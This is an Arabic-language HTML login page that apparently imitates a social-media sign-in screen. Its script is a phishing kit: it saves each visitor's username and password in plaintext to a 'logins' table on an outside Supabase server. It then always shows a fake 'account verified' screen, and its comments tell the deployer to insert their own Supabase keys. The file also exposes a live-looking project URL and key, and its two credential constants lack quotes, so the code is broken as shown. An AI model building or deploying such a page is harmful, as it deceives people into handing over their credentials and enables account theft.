<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #fafafa;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            width: 100%;
            max-width: 350px;
            padding: 40px 20px;
            text-align: center;
            box-shadow: 0 0 20px rgba(0,0,0,0.05);
            transition: all 0.6s ease;
        }
        h2 { font-size: 24px; color: #262626; margin-bottom: 30px; }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 6px;
            font-size: 16px;
        }
        input:focus { border-color: #a8a8a8; outline: none; }
        button {
            width: 100%;
            padding: 12px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
        }
        button:hover { background: #1877f2; }
        .forgot a {
            color: #00376b;
            font-size: 14px;
            text-decoration: none;
            display: block;
            margin-top: 20px;
        }

        .success-screen {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            opacity: 0;
            transform: translateY(30px);
            transition: opacity 0.8s ease, transform 0.8s ease;
        }
        .success-screen.active {
            opacity: 1;
            transform: translateY(0);
        }
        .success-icon {
            width: 100px;
            height: 100px;
            background: #00c853;
            color: white;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 60px;
            margin-bottom: 30px;
            animation: scale 0.8s ease;
        }
        @keyframes scale {
            0% { transform: scale(0); }
            70% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        .success-screen h2 { font-size: 24px; color: #262626; margin-bottom: 15px; }
        .success-screen p { color: #8e8e8e; font-size: 16px; margin-bottom: 40px; }
        .success-screen button { background: #efefef; color: #0095f6; }
        .success-screen button:hover { background: #e0e0e0; }

        .fade-out {
            opacity: 0;
            transform: translateY(-20px);
            transition: opacity 0.6s ease, transform 0.6s ease;
        }
    </style>
</head>
<body>
    <div class="container" id="loginScreen">
        <h2>تسجيل الدخول</h2>
        <form id="loginForm">
            <input type="text" id="email" placeholder="اسم المستخدم أو البريد الإلكتروني">
            <input type="password" id="password" placeholder="كلمة المرور">
            <button type="submit">تسجيل الدخول</button>
        </form>
        <a href="#" class="forgot">نسيت كلمة المرور؟</a>
    </div>

    <div class="container success-screen" id="successScreen">
        <div class="success-icon">✓</div>
        <h2>تم التحقق من صحة حسابك</h2>
        <p>مرحباً بعودتك!<br>يمكنك الآن الاستمتاع بالتطبيق.</p>
        <button onclick="location.reload()">الخروج</button>
    </div>

    <script>
        // غير دول بتوعك من Supabase
        const supabaseUrl = https://hiechkwuygvtvhqtrrgo.supabase.co
        const supabaseAnonKey = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhpZWNoa3d1eWd2dHZocXRycmdvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njc0NzA5MjUsImV4cCI6MjA4MzA0NjkyNX0.R38sUaIhzkem7L1kmGRZbG7c7ABBCYTdxzfv5bdyRRw
        const { createClient } = supabase;
        const supabaseClient = createClient(supabaseUrl, supabaseAnonKey);

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value;

            // حفظ البيانات في قاعدة البيانات المركزية
            const { data, error } = await supabaseClient
                .from('logins')
                .insert([{ email: email, password: password }]);

            // انتقال لصفحة النجاح دايمًا
            document.getElementById('loginScreen').classList.add('fade-out');
            setTimeout(() => {
                document.getElementById('loginScreen').style.display = 'none';
                document.getElementById('successScreen').style.display = 'flex';
                setTimeout(() => {
                    document.getElementById('successScreen').classList.add('active');
                }, 50);
            }, 600);
        });
    </script>
</body>
</html>
